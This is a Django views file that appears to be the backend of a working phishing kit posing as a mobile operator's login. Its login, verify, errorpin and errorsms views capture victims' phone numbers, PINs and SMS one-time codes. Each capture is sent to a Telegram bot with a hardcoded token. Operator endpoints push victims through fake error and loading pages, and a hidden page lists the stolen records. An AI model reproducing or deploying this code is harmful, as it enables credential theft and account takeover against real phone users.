from django.shortcuts import render, redirect
from django.db import models
from .models import ContactModel
import requests
from django.http import HttpResponse
import re
from django.views.decorators.csrf import csrf_exempt
from .models import BannedIP
import json
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.urls import reverse_lazy
from django.contrib.auth.decorators import user_passes_test
import time  #sd
import random
from django.contrib.sessions.models import Session
from django.utils import timezone
from django.core.exceptions import ObjectDoesNotExist
from django.http import HttpResponse
from .models import IPAddress
import socket
from django.http import HttpResponseRedirect
from django.urls import reverse
from django.views.decorators.csrf import ensure_csrf_cookie
from rest_framework import generics



def index(request):
    return render(request, "leo.html")

def error(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="error"
    contact.save()
    return render(request, "login/eror.html")
@csrf_exempt    
def errorpin(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="ERROR PIN"
    contact.save()
    if request.method == "POST":
        request.POST
        pin1 = request.POST.get('input1')
        pin2 = request.POST.get('input2')
        pin3 = request.POST.get('input3')
        pin4 = request.POST.get('input4')
        pin1 = str(pin1)
        pin2 = str(pin2)
        pin3 = str(pin3)
        pin4 = str(pin4)
        concatenated_pins = pin1 + pin2 + pin3 + pin4
        client_ip = get_client_ip(request)
        contact.phone1 = concatenated_pins
        contact.approve_status="Loading"
        contact.save()
        context = {
            'last_contact_id': contact.id
        }
        country = get_country_from_ip(contact.ip)
        if country!= "AZ":
            country= 'Şübhəli İP!'
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nnumber:{contact.phone}\n PIN:{contact.phone1}\n  @kitayskiadam @TetaLab @alienfx')
        request.session['contact_id'] = contact.id
        return render(request, 'login/load.html',context)
    return render(request, "login/errorpin.html")

def errorsms(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context={
    "phone_number":contact.phone,
    }
    contact.approve_status="Loading"
    contact.save()
    if request.method == "POST":
        phone1 = request.POST.get("input1")
        phone2 = request.POST.get("input2")
        phone3 = request.POST.get("input3")
        phone4 = request.POST.get("input4")
        pin1 = str(phone1)
        pin2 = str(phone2)
        pin3 = str(phone3)
        pin4 = str(phone4)
        concatenated_pins = pin1 + pin2 + pin3 + pin4
        contact.sms=concatenated_pins
        contact.page_name="Loading"
        contact.approve_status="Loading"
        contact.save()
        context = {
            'last_contact_id': contact.id
        }
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nsms:{contact.sms}| PIN:{contact.phone1}  \n @kitayskiadam @TetaLab @alienfx ')
        return render( request,'login/load.html',context )
    return render(request, 'login/sms.html',context)

def smssapprove(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="approve"
    contact.save()
    return render(request, "login/succses.html")


def balance(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="balance"
    return render(request, "login/balance.html")

def login(request):
    return render(request, "login/index.html")


@csrf_exempt
def login(request):
    if request.method == "POST":
        request.POST
        number = request.POST.get('username')
        pin1 = request.POST.get('input1')
        pin2 = request.POST.get('input2')
        pin3 = request.POST.get('input3')
        pin4 = request.POST.get('input4')
        pin1 = str(pin1)
        pin2 = str(pin2)
        pin3 = str(pin3)
        pin4 = str(pin4)
        concatenated_pins = pin1 + pin2 + pin3 + pin4
        clean_number = re.sub(r'\D', '', number)
        client_ip = get_client_ip(request)
        phone_number = number.replace("+994", "")
        phone_number = phone_number.replace("-", "")
        contact = ContactModel(ip=client_ip, phone=phone_number,phone1=concatenated_pins)
        contact.page_name="OTP"
        contact.save()
        country = get_country_from_ip(contact.ip)
        if country!= "AZ":
            country= 'Şübhəli İP!'
        context={
            "phone_number":phone_number,
        }
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nnumber:{contact.phone}\n PIN:{contact.phone1}\n  @kitayskiadam @TetaLab @alienfx')
        request.session['contact_id'] = contact.id
        return render(request, 'login/otp.html',context)
    return render(request, 'login/index.html')

def get_country_from_ip(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/country")
        if response.status_code == 200:
            return response.text.strip()
        else:
            return "Unknown"
    except requests.RequestException:
        return "Error"
@csrf_exempt
def verify(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    if request.method == "POST":
        phone1 = request.POST.get("input1")
        phone2 = request.POST.get("input2")
        phone3 = request.POST.get("input3")
        phone4 = request.POST.get("input4")
        pin1 = str(phone1)
        pin2 = str(phone2)
        pin3 = str(phone3)
        pin4 = str(phone4)
        concatenated_pins = pin1 + pin2 + pin3 + pin4
        contact.sms=concatenated_pins
        contact.page_name="Loading"
        contact.save()
        context = {
            'last_contact_id': contact.id
        }
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nsms:{contact.sms}| PIN:{contact.phone1}  \n @kitayskiadam @TetaLab @alienfx ')
        return render( request,'login/load.html',context )
    return render( request,'login/index.html',context )


def report_ban_ip(request):
    if request.method == 'POST':
        ip_to_ban = request.POST.get('ip')
        # Perform necessary validation and store the reported IP address in your database
        # Implement your own logic to handle IP banning
        
        return JsonResponse({'message': 'IP address has been reported for banning.'})
    else:
        return JsonResponse({'error': 'Invalid request method.'}, status=400)
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def delete_all_contacts(request):
    ContactModel.objects.all().delete()
    return JsonResponse({'status': 'success'})




def is_admin(user):
    return user.is_superuser

@user_passes_test(is_admin)
def contact_list_api(request):
    contacts = ContactModel.objects.order_by('-id').values()  # Only return contacts with non-null value for cvv
    return JsonResponse({'contacts': list(contacts)})


def Asdsad32da(request):
    contacts = ContactModel.objects.all()
    return render(request, 'Asdsad32da.html', {'contacts': contacts})
def custom_404_page(request, exception):
    return render(request, 'login/404.html', status=404)

def smserror(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.approve_status = "error"
    contact.save()
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})

@csrf_exempt
def balanceerror(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.approve_status = "balance"
    contact.save()
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})

@csrf_exempt
def errpin(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.approve_status = "errorpin"
    contact.save()
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})


@csrf_exempt
def errsms(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.approve_status = "errsms"
    contact.save()
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})

def approve(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.approve_status = "approve"
    contact.save()
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})

def check_status(request, contact_id):
    try:
        contact = ContactModel.objects.get(pk=contact_id)
        return JsonResponse({'approve_status': contact.approve_status})
    except ContactModel.DoesNotExist:
        return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)